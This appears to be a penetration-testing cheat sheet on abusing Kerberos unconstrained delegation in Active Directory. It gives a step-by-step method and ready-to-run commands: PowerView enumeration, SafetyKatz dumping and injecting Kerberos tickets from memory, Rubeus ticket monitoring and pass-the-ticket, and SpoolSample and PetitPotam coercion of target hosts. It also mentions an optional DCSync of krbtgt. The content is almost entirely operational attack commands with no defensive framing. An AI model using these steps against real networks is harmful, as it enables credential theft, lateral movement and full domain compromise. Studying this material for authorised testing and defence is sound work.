# Methodology
>1. Enumerate computers which have unconstrained delegation enabled (Ignore domain controllers).
>2. Compromise the computer(s) and escalate to admin privileges.
>3. Abuse printer bug or check for high value target tickets in memory.
>4. Capture the TGT of the high value target.
>5. Copy the ticket (remove extra spaces).
>6. Pass the ticket
>7. (OPTIONAL) Dcsync krbtgt.
---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView
**Find computers with unconstrained delegation:**
```powershell
Get-DomainComputer -UnConstrained
```

# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz
**Export local TGTs:**
```cmd
SafetyKatz.exe '"sekurlsa::tickets /export"'
```

**Reuse TGTs:**
```cmd
SafetyKatz.exe '"kerberos::ptt ticket.kirbi"'
```
---
## Rubeus

**Monitor the target for the TGT:**
```cmd
Rubeus.exe monitor /targetuser:target$ /interval:5 /nowrap
```

**Abuse printer bug:**
https://github.com/leechristensen/SpoolSample
https://github.com/topotam/PetitPotam
```cmd
# With SpoolSample
MS-RPRN.exe \\target.contoso.local \\unconstrained.contoso.local

# With PetitPotam
PetitPotam.exe target unconstrained
```

**Pass the ticket:**
```cmd
Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooI...
```